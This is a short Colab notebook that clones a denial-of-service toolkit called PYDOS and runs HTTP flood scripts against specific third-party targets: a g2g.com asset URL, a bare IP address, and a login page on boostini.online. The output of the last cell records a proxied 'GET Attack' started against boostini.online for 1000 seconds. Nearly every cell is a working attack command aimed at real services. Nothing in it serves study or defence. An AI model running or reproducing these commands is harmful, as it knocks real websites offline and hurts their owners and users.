{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!rm -r PYDOS\n",
        "!git clone https://github.com/sayfpack13/PYDOS\n",
        "!pip install -r PYDOS/usage/requirements.txt"
      ],
      "metadata": {
        "id": "fmdt5GYeAW-A"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!python PYDOS/http-dos.py -t 100 -p https://assets.g2g.com/offer/categories.json"
      ],
      "metadata": {
        "id": "RqML6_paBLo4"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!python PYDOS/http-dos2.py -f PYDOS/proxy.txt -url http://46.166.142.81"
      ],
      "metadata": {
        "id": "ROxrec0_B_Pf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!python ddos/ddos GET https://boostini.online/requests.php?f=login 1 100 http.txt 10 1000"
      ],
      "metadata": {
        "id": "bVYowOO1DQND",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "9cfba201-b79b-4be5-b5bf-b695b39c7adf"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "File:  files/proxys/http.txt\n",
            "downloading HTTP's proxy plz wait\n",
            "get Attack Started To boostini.online:443 For 1000 Seconds With 293/2845 Proxy \n",
            "Exception ignored in: <module 'threading' from '/usr/lib/python3.9/threading.py'>\n",
            "Traceback (most recent call last):\n",
            "  File \"/usr/lib/python3.9/threading.py\", line 1428, in _shutdown\n",
            "    def _shutdown():\n",
            "KeyboardInterrupt: \n"
          ]
        }
      ]
    }
  ]
}